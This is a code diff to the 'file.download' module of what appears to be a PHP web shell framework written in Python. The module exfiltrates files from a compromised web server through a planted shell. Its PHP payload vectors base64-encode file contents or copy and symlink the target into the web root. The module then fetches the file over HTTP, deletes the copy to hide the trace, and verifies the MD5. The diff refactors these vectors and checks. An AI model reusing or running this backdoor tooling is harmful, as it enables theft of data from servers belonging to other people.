@@ -15,16 +15,16 @@ class Download(Module):
     :file.download <remote path> <locale path>
     '''
     
-    vectors_order = { 'shell.php' : [  "file()", "fread()", "file_get_contents()", "copy()", "symlink()"], 
+    vectors_order = { 'shell.php' : [  "file", "fread", "file_get_contents", "copy", "symlink"], 
                       'shell.sh'  : [ "base64" ]
                      }
     
     vectors = { 'shell.php' : { 
-                               "file()"             : "print(@base64_encode(implode('', file('%s'))));",
-                               "fread()"            : "$f='%s'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));",
-                                "file_get_contents()"     : "print(@base64_encode(file_get_contents('%s')));",
-                                "copy()"       : "@copy('compress.zlib://%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);",
-                                "symlink()"     : "@symlink('%s','%s/file.txt'); file_exists('%s/file.txt') && print(1);"
+                               "file"             : "print(@base64_encode(implode('', file('%s'))));",
+                               "fread"            : "$f='%s'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));",
+                                "file_get_contents"     : "print(@base64_encode(file_get_contents('%s')));",
+                                "copy"       : "@copy('compress.zlib://%s','%s/file.txt') && print(1);",
+                                "symlink"     : "@symlink('%s','%s/file.txt') && print(1);"
                                 },
                 'shell.sh' : {
                                 "base64" : "base64 -w 0 %s"
@@ -53,12 +53,12 @@ class Download(Module):
         if self.modhandler.load('shell.php').run("is_callable('base64_encode') && print('1');") == '1':
             self.encoder_callable = True
         else:
-            print '[file.download] PHP \'base64_encode()\' transfer methods not available.'
+            print '[file.download] PHP \'base64_encode\' transfer methods not available.'
             
         if self.modhandler.load('shell.php').run("is_callable('md5_file') && print('1');") == '1':
             self.md5_callable = True
         else:
-            print '[file.download] PHP \'md5_file()\' file correctness check not available.'
+            print '[file.download] PHP \'md5_file\' file correctness check not available.'
             
             
     def __slack_probe(self, remote_path, local_path):
@@ -84,14 +84,15 @@ class Download(Module):
                     if payload.count( '%s' ) == 1:
                         payload = payload % remote_path
                         
-                    if (vector.startswith('copy') or vector.startswith('symlink')) and payload.count( '%s' ) == 3:
+                    if (vector == 'copy' or vector == 'symlink') and payload.count( '%s' ) == 2:
                         
                         if not (self.transfer_dir and self.transfer_url_dir):
                             
                             self.transfer_url_dir = self.modhandler.load('find.webdir').url
                             self.transfer_dir = self.modhandler.load('find.webdir').dir
                         
-                        payload = payload % (remote_path, self.transfer_dir, self.transfer_dir)
+                        payload = payload % (remote_path, self.transfer_dir)
+                        
                         
                     response = self.modhandler.load(interpreter).run(payload)
                     
@@ -107,16 +108,24 @@ class Download(Module):
      
     def __process_response(self,response, remote_path, local_path):
         
-        if self.vector.startswith('copy') or self.vector.startswith('symlink') and response == '1':
+        if self.vector.startswith('copy') or self.vector.startswith('symlink'):
+            
+            
             url = self.transfer_url_dir + '/file.txt'
             file_path = self.transfer_dir + '/file.txt'
             
-            print "[file.download] Reading file via \'%s\' and removing" % url
-            
-            response = Request(url).read()
-            
-            if self.modhandler.load('shell.php').run("unlink('%s') && print('1');" % file_path) != '1':
-                print "[!] [find.download] Error cleaning support file %s" % (file_path)
+            if self.modhandler.load('file.check').run(file_path, 'exists'):
+                
+                print "[file.download] Reading file via \'%s\' and removing" % url
+                
+                response = Request(url).read()
+                
+                if self.modhandler.load('shell.php').run("unlink('%s') && print('1');" % file_path) != '1':
+                    print "[!] [find.download] Error cleaning support file %s" % (file_path)
+                    
+            else:
+                    print "[!] [find.download] Error checking existance of %s" % (file_path)
+                
             
         else:
             if self.encoder_callable:
@@ -130,14 +139,14 @@ class Download(Module):
             f.close()
         except Exception, e:
             print '[!] [file.download] Some error occurred writing local file \'%s\'.' % local_path
-            raise ModuleException('[file.download]', e)
+            raise ModuleException(self.name, e)
         else:
             print '[file.download] File downloaded to \'%s\' using method \'%s\'' % (local_path, self.vector)
         
 
         if self.md5_callable:
             response_md5 = md5(response).hexdigest()
-            if self.modhandler.load('shell.php').run("print(md5_file('%s'));" % remote_path) == response_md5:
+            if self.modhandler.load('file.check').run(remote_path, 'md5') == response_md5:
                 print '[file.download] MD5 hash of \'%s\' match.' % local_path
             else:
                 print '[!] [file.download] MD5 hash of \'%s\' file mismatch, file corrupted.' % local_path
